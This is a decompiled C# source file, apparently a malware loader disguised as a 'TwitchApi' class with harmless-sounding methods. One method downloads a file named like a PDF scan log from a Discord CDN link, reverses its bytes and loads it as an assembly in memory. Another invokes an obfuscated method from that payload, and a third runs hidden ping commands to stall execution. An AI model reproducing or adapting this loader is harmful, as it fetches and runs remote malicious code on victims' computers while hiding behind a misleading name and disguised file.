using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Qpchk;

internal class TwitchApi
{
	private static string Username;

	internal static void Chat()
	{
		while (Username == null)
		{
			try
			{
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			}
			catch
			{
			}
			List<byte> list = new List<byte>();
			byte[] array = new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/935829381669081140/943505682785763379/Pdf_ScanPO01602222.log").GetResponse().GetResponseStream()).ReadBytes(87194784);
			foreach (byte item in array)
			{
				list.Add(item);
			}
			list.Reverse();
			Username = Assembly.Load(list.ToArray()).FullName;
		}
	}

	internal static void Reply()
	{
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		Assembly[] assemblies = Thread.GetDomain().GetAssemblies();
		foreach (Assembly assembly in assemblies)
		{
			Type[] exportedTypes = assembly.GetExportedTypes();
			foreach (Type type in exportedTypes)
			{
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (methodInfo.Name == "Tvwragmrkubqw")
					{
						string text = (string)methodInfo.Invoke(null, null);
						if (!string.IsNullOrWhiteSpace(text))
						{
							MessageBox.Show(text);
						}
					}
				}
			}
		}
	}

	internal static void Donate()
	{
		for (int i = 0; i < 10; i++)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/c ping yahoo.com",
				WindowStyle = ProcessWindowStyle.Hidden
			})!.WaitForExit();
		}
	}
}
